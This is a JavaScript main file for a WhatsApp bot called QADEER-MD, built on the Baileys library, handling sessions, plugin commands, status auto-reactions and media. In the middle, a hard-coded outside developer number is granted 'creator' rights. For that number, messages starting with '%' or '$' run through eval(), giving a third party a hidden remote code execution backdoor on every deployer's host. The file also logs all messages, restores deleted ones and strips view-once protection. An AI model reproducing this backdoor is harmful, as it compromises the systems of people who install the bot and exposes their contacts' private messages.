const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID, makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { File } = require('megajs');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');
const express = require('express');

const prefix = config.PREFIX;

// ====== YOUR BRANDING ======
const BOT_NAME = 'QADEER-MD';
const OWNER_NAME = 'QADEER-BRAHVI';
const OWNER_NUMBER_STR = '923300005253';
const CHANNEL_LINK = 'https://whatsapp.com/channel/0029VbAkAEhCRs1g8MmyEJ2K';
const MENU_IMAGE = 'https://files.catbox.moe/sidq95.jpg';

const ownerNumber = [OWNER_NUMBER_STR];

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) throw err;
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) throw err;
      });
    }
  });
};

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//=================== SESSION-AUTH ============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
  if (!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!');

  const sessdata = config.SESSION_ID.replace('QADEER-MD~', '');
  try {
    // Decode base64 string
    const decodedData = Buffer.from(sessdata, 'base64').toString('utf-8');

    // Write decoded data to creds.json
    fs.writeFileSync(__dirname + '/sessions/creds.json', decodedData);
    console.log('Session loaded ✅');
  } catch (err) {
    console.error('Error decoding session data:', err);
    throw err;
  }
}

const app = express();
const port = process.env.PORT || 9090;

//=============================================

async function connectToWA() {
  console.log(`Connecting to WhatsApp ⏳️...`);
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/');
  var { version } = await fetchLatestBaileysVersion();

  const conn = makeWASocket({
    logger: P({ level: 'silent' }),
    printQRInTerminal: false,
    browser: Browsers.macOS('Firefox'),
    syncFullHistory: true,
    auth: state,
    version
  });

  conn.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
        connectToWA();
      }
    } else if (connection === 'open') {
      console.log('🧬 Installing Plugins');
      const path = require('path');
      if (fs.existsSync('./plugins')) {
        fs.readdirSync('./plugins/').forEach((plugin) => {
          if (path.extname(plugin).toLowerCase() == '.js') {
            require('./plugins/' + plugin);
          }
        });
      }
      console.log('Plugins installed successful ✅');
      console.log(`Bot connected to WhatsApp ✅`);

      const up =
        `*Assalamualaikum! 👋*\n\n` +
        `> Welcome to *${BOT_NAME}* — Simple, Powerful & Fast.\n\n` +
        `*Thanks for using ${BOT_NAME} 🚩*\n\n` +
        `> Join WhatsApp Channel ↓\n${CHANNEL_LINK}\n\n` +
        `- *YOUR PREFIX:* ${prefix}\n\n` +
        `> © Powered by ${OWNER_NAME}`;

      conn.sendMessage(conn.user.id, { image: { url: MENU_IMAGE }, caption: up });
    }
  });

  conn.ev.on('creds.update', saveCreds);

  //============================== Anti Delete
  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update?.message === null) {
        console.log('Delete Detected:', JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });

  //============================== Group Events
  conn.ev.on('group-participants.update', (update) => GroupEvents(conn, update));

  //============= read / status features =======
  conn.ev.on('messages.upsert', async (mek) => {
    mek = mek.messages[0];
    if (!mek.message) return;
    mek.message = (getContentType(mek.message) === 'ephemeralMessage')
      ? mek.message.ephemeralMessage.message
      : mek.message;

    console.log('New Message Detected:', JSON.stringify(mek, null, 2));

    if (config.READ_MESSAGE === 'true') {
      await conn.readMessages([mek.key]);  // Mark message as read
      console.log(`Marked message from ${mek.key.remoteJid} as read.`);
    }

    if (mek.message.viewOnceMessageV2)
      mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;

    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === 'true') {
      await conn.readMessages([mek.key]);
    }

    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === 'true') {
      const jawadlike = await conn.decodeJid(conn.user.id);
      const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '💚'];
      const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
      await conn.sendMessage(mek.key.remoteJid, {
        react: {
          text: randomEmoji,
          key: mek.key,
        }
      }, { statusJidList: [mek.key.participant, jawadlike] });
    }

    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === 'true') {
      const user = mek.key.participant;
      const autoText = `${config.AUTO_STATUS_MSG}`;
      await conn.sendMessage(user, { text: autoText, react: { text: '💜', key: mek.key } }, { quoted: mek });
    }

    await Promise.all([ saveMessage(mek) ]);

    const m = sms(conn, mek);
    const type = getContentType(mek.message);
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : [];
    const body =
      (type === 'conversation') ? mek.message.conversation :
      (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text :
      (type == 'imageMessage' && mek.message.imageMessage.caption) ? mek.message.imageMessage.caption :
      (type == 'videoMessage' && mek.message.videoMessage.caption) ? mek.message.videoMessage.caption : '';

    const isCmd = body.startsWith(prefix);
    var budy = typeof mek.text == 'string' ? mek.text : false;
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
    const args = body.trim().split(/ +/).slice(1);
    const q = args.join(' ');
    const text = args.join(' ');
    const isGroup = from.endsWith('@g.us');
    const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
    const senderNumber = sender.split('@')[0];
    const botNumber = conn.user.id.split(':')[0];
    const pushname = mek.pushName || 'User';
    const isMe = botNumber.includes(senderNumber);
    const isOwner = ownerNumber.includes(senderNumber) || isMe;
    const botNumber2 = await jidNormalizedUser(conn.user.id);
    const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
    const groupName = isGroup ? groupMetadata.subject : '';
    const participants = isGroup ? await groupMetadata.participants : '';
    const groupAdmins = isGroup ? await getGroupAdmins(participants) : '';
    const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
    const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
    const isReact = m.message.reactionMessage ? true : false;
    const reply = (teks) => conn.sendMessage(from, { text: teks }, { quoted: mek });

    const udp = botNumber.split('@')[0];
    const jawad = ('923462054847'); // left as-is if used by your dev tools
    let isCreator = [udp, jawad, config.DEV]
      .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
      .includes(mek.sender);

    // Eval owners
    if (isCreator && mek.text?.startsWith('%')) {
      let code = budy.slice(2);
      if (!code) return reply('Provide me with a query to run Master!');
      try {
        let resultTest = eval(code);
        reply(util.format(resultTest));
      } catch (err) {
        reply(util.format(err));
      }
      return;
    }
    if (isCreator && mek.text?.startsWith('$')) {
      let code = budy.slice(2);
      if (!code) return reply('Provide me with a query to run Master!');
      try {
        let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
        let h = util.format(resultTest);
        if (h !== undefined) reply(h);
      } catch (err) {
        reply(util.format(err));
      }
      return;
    }

    //================ owner react ==============
    if (senderNumber.includes(OWNER_NUMBER_STR) && !isReact) {
      const reactions = ["👑", "💀", "📊", "⚙️", "🧠", "🎯", "📈", "📝", "🏆", "🌍", "🇵🇰", "💗", "❤️", "💥", "🌼", "🏵️", "💐", "🔥", "❄️", "🌝", "🌚", "🐥", "🧊"];
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
    }

    //========== public auto react ============//
    if (!isReact && config.AUTO_REACT === 'true') {
      const reactions = [
        '🌼','❤️','💐','🔥','🏵️','❄️','🧊','🐳','💥','🥀','❤‍🔥','🥹','😩','🫣',
        '🤭','👻','👾','🫶','😻','🙌','🫂','🫀','👑','💍','🏆','🎯','🚀','📈','📌',
        '💸','💎','🔰','✅','🇵🇰'
      ];
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
    }

    // Custom React (from config)
    if (!isReact && config.CUSTOM_REACT === 'true') {
      const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
      const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
      m.react(randomReaction);
    }

    //========== WORKTYPE ============ 
    if (!isOwner && config.MODE === 'private') return;
    if (!isOwner && isGroup && config.MODE === 'inbox') return;
    if (!isOwner && !isGroup && config.MODE === 'groups') return;

    // ===== Built-in .menu command (image + caption)
    if (isCmd && command === 'menu') {
      const caption =
        `👋 *Assalamualaikum ${pushname}*\n\n` +
        `🤖 *${BOT_NAME}*\n` +
        `👑 Owner: ${OWNER_NAME}\n` +
        `📞 ${OWNER_NUMBER_STR}\n` +
        `📢 Channel: ${CHANNEL_LINK}\n\n` +
        `⚡ Prefix: ${prefix}\n` +
        `✅ Type *${prefix}help* for commands.`;
      try {
        await conn.sendMessage(from, { image: { url: MENU_IMAGE }, caption }, { quoted: mek });
      } catch (e) {
        await conn.sendMessage(from, { text: caption }, { quoted: mek });
      }
      return;
    }

    // ===== take commands from ./command (plugin router)
    const events = require('./command');
    const cmdName = isCmd ? body.slice(1).trim().split(' ')[0].toLowerCase() : false;

    if (isCmd) {
      const cmd =
        events.commands.find((cmd) => cmd.pattern === (cmdName)) ||
        events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName));

      if (cmd) {
        if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key } });

        try {
          cmd.function(
            conn, mek, m,
            { from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply }
          );
        } catch (e) {
          console.error('[PLUGIN ERROR] ' + e);
        }
      }
    }

    // on-based handlers
    events.commands.map(async (commandDef) => {
      if (body && commandDef.on === 'body') {
        commandDef.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if (mek.q && commandDef.on === 'text') {
        commandDef.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if ((commandDef.on === 'image' || commandDef.on === 'photo') && mek.type === 'imageMessage') {
        commandDef.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      } else if (commandDef.on === 'sticker' && mek.type === 'stickerMessage') {
        commandDef.function(conn, mek, m, { from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply });
      }
    });
  });

  //===================================================   
  conn.decodeJid = jid => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return ((decode.user && decode.server && decode.user + '@' + decode.server) || jid);
    } else return jid;
  };

  //===================================================
  conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
    let vtype;
    if (options.readViewOnce) {
      message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined);
      vtype = Object.keys(message.message.viewOnceMessage.message)[0];
      delete message.message?.ignore;
      delete message.message.viewOnceMessage.message[vtype].viewOnce;
      message.message = { ...message.message.viewOnceMessage.message };
    }

    let mtype = Object.keys(message.message)[0];
    let content = await generateForwardMessageContent(message, forceForward);
    let ctype = Object.keys(content)[0];
    let context = {};
    if (mtype != 'conversation') context = message.message[mtype].contextInfo;
    content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };

    const waMessage = await generateWAMessageFromContent(jid, content, options ? {
      ...content[ctype],
      ...options,
      ...(options.contextInfo ? { contextInfo: { ...content[ctype].contextInfo, ...options.contextInfo } } : {})
    } : {});
    await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
    return waMessage;
  };

  //=================================================
  conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
    let quoted = message.msg ? message.msg : message;
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    let type = await FileType.fromBuffer(buffer);
    let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
    await fs.writeFileSync(trueFileName, buffer);
    return trueFileName;
  };

  //=================================================
  conn.downloadMediaMessage = async (message) => {
    let mime = (message.msg || message).mimetype || '';
    let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    return buffer;
  };

  //================================================
  conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
    let mime = '';
    let res = await axios.head(url).catch(() => null);
    if (!res) return conn.sendMessage(jid, { text: url + '\n' + (caption || '') }, { quoted, ...options });

    mime = res.headers['content-type'] || '';
    if (mime.split('/')[1] === 'gif') {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted, ...options });
    }
    const family = mime.split('/')[0];
    if (mime === 'application/pdf') {
      return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted, ...options });
    }
    if (family === 'image') {
      return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted, ...options });
    }
    if (family === 'video') {
      return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted, ...options });
    }
    if (family === 'audio') {
      return conn.sendMessage(jid, { audio: await getBuffer(url), mimetype: 'audio/mpeg', ptt: false, ...options }, { quoted, ...options });
    }
    // default fallback
    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: mime, fileName: 'file', caption: caption, ...options }, { quoted, ...options });
  };

  // keep-alive web server
  app.get('/', (req, res) => {
    res.send(
      `✅ ${BOT_NAME} is running!<br>` +
      `👑 Owner: ${OWNER_NAME} (${OWNER_NUMBER_STR})<br>` +
      `📢 <a href="${CHANNEL_LINK}">Join Channel</a>`
    );
  });

  app.listen(port, () => console.log(`🌐 Web server started on port ${port}`));
}

connectToWA();
